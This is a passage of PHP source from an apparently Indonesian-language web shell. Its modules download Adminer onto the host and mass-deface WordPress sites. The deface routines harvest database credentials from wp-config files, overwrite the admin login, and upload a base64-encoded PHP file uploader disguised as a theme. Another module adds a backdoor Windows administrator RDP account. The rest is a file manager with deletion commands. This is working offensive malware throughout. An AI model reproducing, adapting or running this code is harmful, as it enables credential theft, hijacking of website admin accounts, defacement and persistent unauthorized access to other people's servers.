elseif($_GET['do'] == 'adminer') {
    $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
    function adminer($url, $isi) {
        $fp = fopen($isi, "w");
        $ch = curl_init();
              curl_setopt($ch, CURLOPT_URL, $url);
              curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
              curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
              curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
              curl_setopt($ch, CURLOPT_FILE, $fp);
        return curl_exec($ch);
              curl_close($ch);
        fclose($fp);
        ob_flush();
        flush();
    }
    if(file_exists('adminer.php')) {
        echo "<center><a href='$full/adminer.php' target='_blank'><font color='lime'>> ADMINER LOGIN <</a></font></center>";
    } else {
        if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
            echo "<center><a href='$full/adminer.php' target='_blank'><font color='lime'>> ADMINER LOGIN <</a></font></center>";
        } else {
            echo "<center><font color='red'>gagal buat file adminer</font></center>";
        }
    }
}
elseif($_GET['do'] == 'auto_dwp') {
    if($_POST['auto_deface_wp']) {
        function anucurl($sites) {
            $ch = curl_init($sites);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        function lohgin($cek, $web, $userr, $pass, $wp_submit) {
            $post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
            $ch = curl_init($cek);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_POST, 1);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        $scan = $_POST['link_config'];
        $link_config = scandir($scan);
        $script = htmlspecialchars($_POST['script']);
        $user = "mrxbarakuda";
        $pass = "mrxbarakuda";
        $passx = md5($pass);
        foreach($link_config as $dir_config) {
            if(!is_file("$scan/$dir_config")) continue;
            $config = file_get_contents("$scan/$dir_config");
            if(preg_match("/WordPress/", $config)) {
                $dbhost = ambilkata($config,"DB_HOST', '","'");
                $dbuser = ambilkata($config,"DB_USER', '","'");
                $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                $dbname = ambilkata($config,"DB_NAME', '","'");
                $dbprefix = ambilkata($config,"table_prefix  = '","'");
                $prefix = $dbprefix."users";
                $option = $dbprefix."options";
                $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                $db = mysql_select_db($dbname);
                $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                $result = mysql_fetch_array($q);
                $id = $result[ID];
                $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                $result2 = mysql_fetch_array($q2);
                $target = $result2[option_value];
                if($target == '') {
                    echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
                } else {
                    echo "[+] $target <br>";
                }
                $update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
                if(!$conn OR !$db OR !$update) {
                    echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
                    mysql_close($conn);
                } else {
                    $site = "$target/wp-login.php";
                    $site2 = "$target/wp-admin/theme-install.php?upload";
                    $b1 = anucurl($site2);
                    $wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"\",\"\" />");
                    $b = lohgin($site, $site2, $user, $pass, $wp_sub);
                    $anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"\",\"\" />");
                    $upload3 = base64_decode("PD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQokbmV3ZmlsZTM9ImsucGhwIjsNCmlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCm1vdmVfdXBsb2FkZWRfZmlsZSgkZmlsZTNbJ3RtcF9uYW1lJ10sICIuLi8uLi8uLi8uLi8kbmV3ZmlsZTMiKTsNCj8+");
                    $www = "m.php";
                    $fp5 = fopen($www,"w");
                    fputs($fp5,$upload3);
                    $post2 = array(
                            "_wpnonce" => "$anu2",
                            "_wp_http_referer" => "/wp-admin/theme-install.php?upload",
                            "themezip" => "@$www",
                            "install-theme-submit" => "Install Now",
                            );
                    $ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
                          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                          curl_setopt($ch, CURLOPT_POST, 1);
                          curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
                          curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                          curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                          curl_setopt($ch, CURLOPT_COOKIESESSION, true);
                    $data3 = curl_exec($ch);
                          curl_close($ch);
                    $y = date("Y");
                    $m = date("m");
                    $namafile = "id.php";
                    $fpi = fopen($namafile,"w");
                    fputs($fpi,$script);
                    $ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
                           curl_setopt($ch6, CURLOPT_POST, true);
                           curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
                           curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
                           curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
                           curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
                           curl_setopt($ch6, CURLOPT_COOKIESESSION, true);
                    $postResult = curl_exec($ch6);
                           curl_close($ch6);
                    $as = "$target/k.php";
                    $bs = anucurl($as);
                    if(preg_match("#$script#is", $bs)) {
                        echo "[+] <font color='lime'>berhasil mepes...</font><br>";
                        echo "[+] <a href='$as' target='_blank'>$as</a><br><br>";
                        } else {
                        echo "[-] <font color='red'>gagal mepes...</font><br>";
                        echo "[!!] coba aja manual: <br>";
                        echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                        echo "[+] username: <font color=lime>$user</font><br>";
                        echo "[+] password: <font color=lime>$pass</font><br><br>";
                        }
                    mysql_close($conn);
                }
            }
        }
    } else {
        echo "<center><h3>WordPress Auto Deface</h3>
        <form method='post'>
        <input type='text' name='link_config' size='50' height='10' value='$dir'><br>
        <input type='text' name='script' height='10' size='50' placeholder='Visited By Mr.xBarakuda' required><br>
        <input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
        </form>
        <br><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span>
        </center>";
    }
}
elseif($_GET['do'] == 'auto_dwp2') {
    if($_POST['auto_deface_wp']) {
        function anucurl($sites) {
            $ch = curl_init($sites);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        function lohgin($cek, $web, $userr, $pass, $wp_submit) {
            $post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
            $ch = curl_init($cek);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_POST, 1);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        $link = explode("\r\n", $_POST['link']);
        $script = htmlspecialchars($_POST['script']);
        $user = "mrxbarakuda";
        $pass = "mrxbarakuda";
        $passx = md5($pass);
        foreach($link as $dir_config) {
            $config = anucurl($dir_config);
            $dbhost = ambilkata($config,"DB_HOST', '","'");
            $dbuser = ambilkata($config,"DB_USER', '","'");
            $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
            $dbname = ambilkata($config,"DB_NAME', '","'");
            $dbprefix = ambilkata($config,"table_prefix  = '","'");
            $prefix = $dbprefix."users";
            $option = $dbprefix."options";
            $conn = mysql_connect($dbhost,$dbuser,$dbpass);
            $db = mysql_select_db($dbname);
            $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
            $result = mysql_fetch_array($q);
            $id = $result[ID];
            $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
            $result2 = mysql_fetch_array($q2);
            $target = $result2[option_value];
            if($target == '') {
                echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
            } else {
                echo "[+] $target <br>";
            }
            $update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
            if(!$conn OR !$db OR !$update) {
                echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
                mysql_close($conn);
            } else {
                $site = "$target/wp-login.php";
                $site2 = "$target/wp-admin/theme-install.php?upload";
                $b1 = anucurl($site2);
                $wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"\",\"\" />");
                $b = lohgin($site, $site2, $user, $pass, $wp_sub);
                $anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"\",\"\" />");
                $upload3 = base64_decode("PD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQokbmV3ZmlsZTM9ImsucGhwIjsNCmlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCm1vdmVfdXBsb2FkZWRfZmlsZSgkZmlsZTNbJ3RtcF9uYW1lJ10sICIuLi8uLi8uLi8uLi8kbmV3ZmlsZTMiKTsNCj8+");
                $www = "m.php";
                $fp5 = fopen($www,"w");
                fputs($fp5,$upload3);
                $post2 = array(
                        "_wpnonce" => "$anu2",
                        "_wp_http_referer" => "/wp-admin/theme-install.php?upload",
                        "themezip" => "@$www",
                        "install-theme-submit" => "Install Now",
                        );
                $ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
                      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                      curl_setopt($ch, CURLOPT_POST, 1);
                      curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
                      curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                      curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
                $data3 = curl_exec($ch);
                      curl_close($ch);
                $y = date("Y");
                $m = date("m");
                $namafile = "id.php";
                $fpi = fopen($namafile,"w");
                fputs($fpi,$script);
                $ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
                       curl_setopt($ch6, CURLOPT_POST, true);
                       curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
                       curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
                       curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
                       curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
                       curl_setopt($ch6, CURLOPT_COOKIESESSION,true);
                $postResult = curl_exec($ch6);
                       curl_close($ch6);
                $as = "$target/k.php";
                $bs = anucurl($as);
                if(preg_match("#$script#is", $bs)) {
                    echo "[+] <font color='lime'>berhasil mepes...</font><br>";
                    echo "[+] <a href='$as' target='_blank'>$as</a><br><br>";
                    } else {
                    echo "[-] <font color='red'>gagal mepes...</font><br>";
                    echo "[!!] coba aja manual: <br>";
                    echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                    echo "[+] username: <font color=lime>$user</font><br>";
                    echo "[+] password: <font color=lime>$pass</font><br><br>";
                    }
                mysql_close($conn);
            }
        }
    } else {
        echo "<center><h3>WordPress Auto Deface V.2</h3>
        <form method='post'>
        Link Config: <br>
        <textarea name='link' placeholder='http://target.com/kuda_config/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
        <input type='text' name='script' height='10' size='50' placeholder='Visited By Mr.xBarakuda' required><br>
        <input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
        </form></center>";
    }
} elseif($_GET['do'] == 'krdp_shell') {
    if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
        if($_POST['create']) {
            $user = htmlspecialchars($_POST['user']);
            $pass = htmlspecialchars($_POST['pass']);
            if(preg_match("/$user/", exe("net user"))) {
                echo "<center>[INFO] -> <font color=red>user <font color=lime>$user</font> sudah ada</font></center>";
            } else {
                $add_user   = exe("net user $user $pass /add");
                $add_groups1 = exe("net localgroup Administrators $user /add");
                $add_groups2 = exe("net localgroup Administrator $user /add");
                $add_groups3 = exe("net localgroup Administrateur $user /add");
                echo "[ RDP ACCOUNT INFO ]<br>
                ------------------------------<br>
                IP: <font color=lime>".$ip."</font><br>
                Username: <font color=lime>$user</font><br>
                Password: <font color=lime>$pass</font><br>
                ------------------------------<br><br>
                [ STATUS ]<br>
                ------------------------------<br>
                ";
                if($add_user) {
                    echo "[add user] -> <font color='lime'>Berhasil</font><br>";
                } else {
                    echo "[add user] -> <font color='red'>Gagal</font><br>";
                }
                if($add_groups1) {
                    echo "[add localgroup Administrators] -> <font color='lime'>Berhasil</font><br>";
                } elseif($add_groups2) {
                    echo "[add localgroup Administrator] -> <font color='lime'>Berhasil</font><br>";
                } elseif($add_groups3) {
                    echo "[add localgroup Administrateur] -> <font color='lime'>Berhasil</font><br>";
                } else {
                    echo "[add localgroup] -> <font color='red'>Gagal</font><br>";
                }
                echo "------------------------------<br>";
            }
        } elseif($_POST['s_opsi']) {
            $user = htmlspecialchars($_POST['r_user']);
            if($_POST['opsi'] == '1') {
                $cek = exe("net user $user");
                echo "Checking username <font color=lime>$user</font> ....... ";
                if(preg_match("/$user/", $cek)) {
                    echo "[ <font color=lime>Sudah ada</font> ]<br>
                    ------------------------------<br><br>
                    <pre>$cek</pre>";
                } else {
                    echo "[ <font color=red>belum ada</font> ]";
                }
            } elseif($_POST['opsi'] == '2') {
                $cek = exe("net user $user mrxbarakuda");
                if(preg_match("/$user/", exe("net user"))) {
                    echo "[change password: <font color=lime>mrxbarakuda</font>] -> ";
                    if($cek) {
                        echo "<font color=lime>Berhasil</font>";
                    } else {
                        echo "<font color=red>Gagal</font>";
                    }
                } else {
                    echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
                }
            } elseif($_POST['opsi'] == '3') {
                $cek = exe("net user $user /DELETE");
                if(preg_match("/$user/", exe("net user"))) {
                    echo "[remove user: <font color=lime>$user</font>] -> ";
                    if($cek) {
                        echo "<font color=lime>Berhasil</font>";
                    } else {
                        echo "<font color=red>Gagal</font>";
                    }
                } else {
                    echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
                }
            } else {
                //
            }
        } else {
            echo "-- Create RDP --<br>
            <form method='post'>
            <input type='text' name='user' placeholder='username' value='mrxbarakuda' required>
            <input type='text' name='pass' placeholder='password' value='mrxbarakuda' required>
            <input type='submit' name='create' value='>>'>
            </form>
            -- Option --<br>
            <form method='post'>
            <input type='text' name='r_user' placeholder='username' required>
            <select name='opsi'>
            <option value='1'>Cek Username</option>
            <option value='2'>Ubah Password</option>
            <option value='3'>Hapus Username</option>
            </select>
            <input type='submit' name='s_opsi' value='>>'>
            </form>
            ";
        }
    } else {
        echo "<font color=red>Fitur ini hanya dapat digunakan dalam Windows Server.</font>";
    }
} elseif($_GET['act'] == 'newfile') {
    if($_POST['new_save_file']) {
        $newfile = htmlspecialchars($_POST['newfile']);
        $fopen = fopen($newfile, "a+");
        if($fopen) {
            $act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
        } else {
            $act = "<font color=red>permission denied</font>";
        }
    }
    echo $act;
    echo "<form method='post'>
    Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
    <input type='submit' name='new_save_file' value='Submit'>
    </form>";
} elseif($_GET['act'] == 'newfolder') {
    if($_POST['new_save_folder']) {
        $new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
        if(!mkdir($new_folder)) {
            $act = "<font color=red>permission denied</font>";
        } else {
            $act = "<script>window.location='?dir=".$dir."';</script>";
        }
    }
    echo $act;
    echo "<form method='post'>
    Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
    <input type='submit' name='new_save_folder' value='Submit'>
    </form>";
} elseif($_GET['act'] == 'rename_dir') {
    if($_POST['dir_rename']) {
        $dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
        if($dir_rename) {
            $act = "<script>window.location='?dir=".dirname($dir)."';</script>";
        } else {
            $act = "<font color=red>permission denied</font>";
        }
    echo "".$act."<br>";
    }
    echo "<form method='post'>
    <input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
    <input type='submit' name='dir_rename' value='rename'>
    </form>";
} elseif($_GET['act'] == 'delete_dir') {
    if(is_dir($dir)) {
        if(is_writable($dir)) {
            @rmdir($dir);
            @exe("rm -rf $dir");
            @exe("rmdir /s /q $dir");
            $act = "<script>window.location='?dir=".dirname($dir)."';</script>";
        } else {
            $act = "<font color=red>could not remove ".basename($dir)."</font>";
        }
    }
    echo $act;
} elseif($_GET['act'] == 'view') {
    echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
    echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
    if($_POST['save']) {
        $save = file_put_contents($_GET['file'], $_POST['src']);
        if($save) {
            $act = "<font color=lime>Saved!</font>";
        } else {
            $act = "<font color=red>permission denied</font>";
        }
    echo "".$act."<br>";
    }
    echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
    echo "<form method='post'>
    <textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
    <center><input type='submit' value='Save' name='save' style='width: 500px;'>
    </form>";
} elseif($_GET['act'] == 'rename') {
    if($_POST['do_rename']) {
        $rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
        if($rename) {
            $act = "<script>window.location='?dir=".$dir."';</script>";
        } else {
            $act = "<font color=red>permission denied</font>";
        }
    echo "".$act."<br>";
    }
    echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
    echo "<form method='post'>
    <input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
    <input type='submit' name='do_rename' value='rename'>
    </form>";
} elseif($_GET['act'] == 'delete') {
    $delete = unlink($_GET['file']);
    if($delete) {
        $act = "<script>window.location='?dir=".$dir."';</script>";
    } else {
        $act = "<font color=red>permission denied</font>";
    }
    echo $act;
} else {
    if(is_dir($dir) === true) {
        if(!is_readable($dir)) {
            echo "<font color=red>can't open directory. ( not readable )</font>";
        } else {
            echo '<table width="100%" class="table_home" border="1" cellpadding="3" cellspacing="1" align="center">
            <tr>
            <th class="th_home"><center>Name</center></th>
            <th class="th_home"><center>Type</center></th>
            <th class="th_home"><center>Size</center></th>
            <th class="th_home"><center>Last Modified</center></th>
            <th class="th_home"><center>Owner/Group</center></th>
            <th class="th_home"><center>Permission</center></th>
            <th class="th_home"><center>Action</center></th>
            </tr>';
            $scandir = scandir($dir);
            foreach($scandir as $dirx) {
                $dtype = filetype("$dir/$dirx");
                $dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
                if(function_exists('posix_getpwuid')) {
                    $downer = @posix_getpwuid(fileowner("$dir/$dirx"));
                    $downer = $downer['name'];
                } else {
                    //$downer = $uid;
                    $downer = fileowner("$dir/$dirx");
                }
                if(function_exists('posix_getgrgid')) {
                    $dgrp = @posix_getgrgid(filegroup("$dir/$dirx"));
                    $dgrp = $dgrp['name'];
                } else {
                    $dgrp = filegroup("$dir/$dirx");
                }
                if(!is_dir("$dir/$dirx")) continue;
                if($dirx === '..') {
                    $href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
                } elseif($dirx === '.') {
                    $href = "<a href='?dir=$dir'>$dirx</a>";
                } else {
                    $href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
                }
                if($dirx === '.' || $dirx === '..') {
                    $act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
                    } else {
                    $act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a>";
                }
                echo "<tr>";
                echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAADwklEQVR42rVVX0hbVxz+fjexMf8zMG6JCR2Vxk7asgfpm2QMSsE+1GLd1u2lbC9tHwaljD2220uFIRN8GLg/bw4MK2VVETvHJoExQSZN60bY1iRCmxozadRWk5vk7Jx7vfHkJvNhtAcu99xzfuf7fn++37mEFzzImIyPj1/o7e29oSiKtkZU24Kqqk+Hh4dPjY6O/vW/CZaWlu74/f6TAlgGZ4xp3/F4/MNYLPalGUDsm9/lchlTU1M7NYLJycmPu7q6blSrVeIP448AJd1eIyAxMd4SuGZfqVRgnOUZ0BxKp9OfDgwMXKdUKhULBoPndtOigRrRSWAGGe1sb7PWVjs3YhqB2X73iLa+urr6HWWz2YTP5zsmp6XZEAfTDx7AfqAVNqcdHq+3LjXmuRiFQuEeZTKZn9ra2qKyp+a58DSTSjGHzUH5f9ZYIByCVyeoi9Ic8fr6+jwlk8mbgUDg7H4EP/4wRwdDYVYsFUktqaz7+FFYW1rk1DU9m8vlbtHCwsJXkUjkg/9KTT6fx9T3t9ERDKK9zQ+uNDg9bri8nprazKkxlLeysvI1zczMDPf09FwRC4ZQZC+EopK//0EtpDCXx0MOp5M5XA4wXc4N9vJ8eXn5c5qYmLgWjUav7ZciIcFc9jHzuN1k5wRkUXAvkcBr3d3EZVmrk3gZjor54uLiJzQ2Nna1r6/vMxm0WTRc62xtNUehcJgl7t5FMNQBD4/IaA2zZMV8fn7+IxoZGbnY39//hZE/o5PlvIrv/Noa0n+nUGYV8KaE1+er2YpGazZmZ2cv0dDQ0IXBwcFvZGbRjbLshJtbm1sskUhQZ+ch5m9vr3EbzWXqcg1nenr6fRp4+73z0TdPfitdSxDiqNNFvUhqKmHShq7Xertf4j+/S+TuOMdsvlhDkTteJRx5nUEtAQpHO3yMYT1HeJhmOBgBtreA4o6ey3QS+PO+zKjXsrTxFsH1yhnYXrq1u6wbie1Tg4TIcQHK7/JRwjuX+TWpEuxOhmcc3OEEjp4gzN1k2NwAfp3bO3uom/Aow/Dk4VkiZ3sfj2C6oUIn3gCcbnBQYOMJn7sAUcxSEQh3ggMAL4eApxx8swD8Ftdjt1qBHn6WR0Ur908TrK1HYPNO8C03nt8QVJsoFs7zgMjGnwBfsNSZ6EqSqs6MCut74m3cwKzKu1GqsMUiurPC17OCwMrzZm/wwXqAbym6M6qqh16r366TikVPoSAsl/b2FY1AEG8La4FibSAQ4Mb/RxhrXmNvTZI1qs0bjY/y/n+Z5zBeOMG/LYTnh2D42esAAAAASUVORK5CYII='>$href</td>";
                echo "<td class='td_home'><center>$dtype</center></td>";
                echo "<td class='td_home'><center>-</center></th></td>";
                echo "<td class='td_home'><center>$dtime</center></td>";
                echo "<td class='td_home'><center>$downer/$dgrp</center></td>";
                echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
                echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
                echo "</tr>";
            }
        }
    } else {
        echo "<font color=red>can't open directory.</font>";
    }
        foreach($scandir as $file) {
            $ftype = filetype("$dir/$file");
            $ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
            $size = filesize("$dir/$file")/1024;
            $size = round($size,3);
            if(function_exists('posix_getpwuid')) {
                $fowner = @posix_getpwuid(fileowner("$dir/$file"));
                $fowner = $fowner['name'];
            } else {
                //$downer = $uid;
                $fowner = fileowner("$dir/$file");
            }
            if(function_exists('posix_getgrgid')) {
                $fgrp = @posix_getgrgid(filegroup("$dir/$file"));
                $fgrp = $fgrp['name'];
            } else {
                $fgrp = filegroup("$dir/$file");
            }
            if($size > 1024) {
                $size = round($size/1024,2). 'MB';
            } else {
                $size = $size. 'KB';
            }
            if(!is_file("$dir/$file")) continue;
            echo "<tr>";
